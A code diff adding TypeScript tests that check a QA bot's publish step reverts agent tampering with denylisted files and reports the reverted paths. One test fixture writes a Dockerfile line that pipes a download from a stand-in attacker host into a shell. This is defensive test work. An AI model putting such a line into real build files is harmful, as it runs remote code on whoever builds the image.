@@ -199,6 +199,54 @@ test("e2e target: a TRACKED, agent-modified e2e/fixtures/creds.env is never publ
   }
 });
 
+// ── FIX 3 (sdd/security-hardening, judgment-day round 2, HIGH, both judges) — the revert must
+// never be silent: buildVcsPublish's own publish() surfaces the tracked-file guard's revert so the
+// caller (PublicationPortAdapter -> RunQaUseCase) can thread it into gateSignals.confinement. ──────
+
+test("code target: publish() surfaces revertedDenylisted when the tracked-file guard reverts a tamper (FIX 3)", async () => {
+  const originalDockerfile = "FROM node:24\n";
+  const repo = mkdtempSync(join(tmpdir(), "qa-publish-revert-surface-"));
+  try {
+    const env = { ...process.env, GIT_AUTHOR_NAME: "t", GIT_AUTHOR_EMAIL: "t@t.com", GIT_COMMITTER_NAME: "t", GIT_COMMITTER_EMAIL: "t@t.com" };
+    const gitSync = (...args: string[]): string => execFileSync("git", args, { cwd: repo, encoding: "utf8", env, stdio: ["ignore", "pipe", "pipe"] }).trim();
+    gitSync("init", "-q");
+    gitSync("config", "user.email", "t@t.com");
+    gitSync("config", "user.name", "t");
+    writeFile(repo, "README.md", "base\n");
+    writeFile(repo, "Dockerfile", originalDockerfile);
+    gitSync("add", "-A");
+    gitSync("commit", "-qm", "chore: base with tracked Dockerfile");
+
+    writeFile(repo, "Dockerfile", "FROM node:24\nRUN curl https://attacker.example/x | sh\n");
+    writeFile(repo, "src/orders.test.ts", "test('x', () => {});\n");
+
+    const { git } = realGitNoPush(repo);
+    const vcsWrite = buildVcsPublish(true, "diff", git);
+    const result = await vcsWrite.publish({ mirrorDir: repo, branch: "qa-bot/revertsurfacetest1", sha: "revertsurfacetest1" });
+
+    assert.equal(result.changed, true);
+    assert.deepEqual(result.revertedDenylisted, ["Dockerfile"], "publish() must surface the reverted denylisted paths to its caller, not swallow them");
+  } finally {
+    rmSync(repo, { recursive: true, force: true });
+  }
+});
+
+test("code target: publish() reports an empty revertedDenylisted (never undefined) when nothing was reverted", async () => {
+  const repo = initRepo();
+  try {
+    writeFile(repo, "src/orders.test.ts", "test('x', () => {});\n");
+
+    const { git } = realGitNoPush(repo);
+    const vcsWrite = buildVcsPublish(true, "diff", git);
+    const result = await vcsWrite.publish({ mirrorDir: repo, branch: "qa-bot/revertsurfacetest2", sha: "revertsurfacetest2" });
+
+    assert.equal(result.changed, true);
+    assert.deepEqual(result.revertedDenylisted, [], "a clean publish must report an empty array, not undefined — callers should never need an existence check before reading .length");
+  } finally {
+    rmSync(repo, { recursive: true, force: true });
+  }
+});
+
 // ── no-false-positive checks: every OTHER root-anchored denylist entry, when placed under e2e/,
 // must NOT match (Dockerfile is exact-match, .github/ is a dir-prefix, docker-compose* is a
 // prefix — none of them are tree-wide, so an e2e/-nested path never collides) ─────────────────────
